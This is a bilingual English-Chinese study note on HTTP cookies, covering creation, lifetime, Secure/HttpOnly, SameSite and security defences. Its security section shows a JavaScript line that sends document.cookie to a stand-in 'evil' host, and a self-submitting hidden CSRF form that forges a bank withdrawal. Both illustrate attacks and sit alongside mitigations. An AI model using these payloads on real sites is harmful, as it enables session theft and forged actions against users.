---
id: cookie
title: Cookie
---

An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with the next request to the same server. Typically, it's used to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.

服务器发送cookie给用户浏览器，浏览器存储cookie并且在下次请求中带上cookie。通常，cookie用于告诉服务器两个请求是否来自同一个浏览器（记住状态）。

使用cookie的三个目的：

  1. `Session Management` Logins, shopping carts, game scores, or anything else the server should remember

  2. `Personalization` User preferences, themes and other settings

  3. `Tracking` Recording and analyzing user behavior

因为每次请求都会带上cookie，所以在网速受限的情况下会影响性能。如果只是想在客户端存储信息，可以使用`Web Storage Api`和`IndexedDB`.

## Creating cookies

When receiving an HTTP request, a server can send a `Set-Cookie` header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a `Cookie` HTTP header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additionally, restrictions to a specific domain and path can be set, limiting where the cookie is sent.

服务器通过返回Set-Cookie header使浏览器保存cookie，浏览器发送请求时带着Cookie header来把cookie传回服务器。可以设置cookie的有限时间，发送的domain和path来限制它的发送。

## Session cookies

不设定Expires或Max-Age的cookie，会在页面关闭时失效，但是浏览器可以恢复页面，所以这种类型的cookie也是可以恢复的。

## Permanent cookies

设定Expires或者Max-Age的cookie，会在截止时间之前永久有效。截止时间是相对于客户端时间的，而不是服务器。

## Secure and HttpOnly cookies

Secure cookie 只支持HTTPS，HttpOnly cookie不能用document.cookie访问，只能送给服务器，相当于对用户隐身。

## Scope of cookies

Domain 和 Path 决定了cookie要送往的URL。

## SameSite cookies

服务器可以设置跨域请求能不能带上cookie，帮助防御CSRF攻击。

`None` 无限制

`Strict` 只允许同域请求带cookie

`Lax` 默认，禁止跨域子请求，比如加载图片或frames，但是当用户从外部链接导航到URL时，允许带cookie。

## Security

### Session hijacking and XSS

Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an XSS vulnerability in the application.

```javascript
(new Image()).src = "http://www.evil-domain.example.com/steal-cookie?cookie=" + document.cookie;
```

The `HttpOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript. Exfiltration avenues can be limited by deploying a strict Content-Security-Policy.

### Cross-site request forgery (CSRF)

CSRF (Cross-Site Request Forgery) is an attack that impersonates a trusted user and sends a website unwanted commands. This can be done, for example, by including malicious parameters in a URL behind a link that purports to go somewhere else:

```html
<img src="https://www.example.com/index.php?action=delete&id=123">

<form action="https://bank.example.com/withdraw" method="POST">
  <input type="hidden" name="account" value="bob">
  <input type="hidden" name="amount" value="1000000">
  <input type="hidden" name="for" value="mallory">
</form>
<script>
  window.addEventListener('DOMContentLoaded', (e) => { document.querySelector('form').submit(); }
</script>
```

防止CSRF的方法：implement RESTful API, add secure token, etc.

1. 不要用GET带query参数的方法替代POST，规避GET形式的CSRF

2. `<form>`中要隐藏一个CSRF token, 该token对每个用户来说是独特的，并且存储在服务器上。服务器处理请求时要比对请求中的token和服务器上的token是否一致。This method of protection relies on an attacker being unable to predict the user's assigned CSRF token. The token should be regenerated on sign-in.

3. Cookies that are used for sensitive actions (such as session cookies) should have a short lifetime with the SameSite attribute set to `Strict` or `Lax`. (See `SameSite` cookies above). In supporting browsers, this will have the effect of ensuring that the session cookie is not sent along with cross-site requests and so the request is effectively unauthenticated to the application server.

4. Both CSRF tokens and SameSite cookies should be deployed. This ensures all browsers are protected and provides protection where SameSite cookies cannot help (such as attacks originating from a separate subdomain).
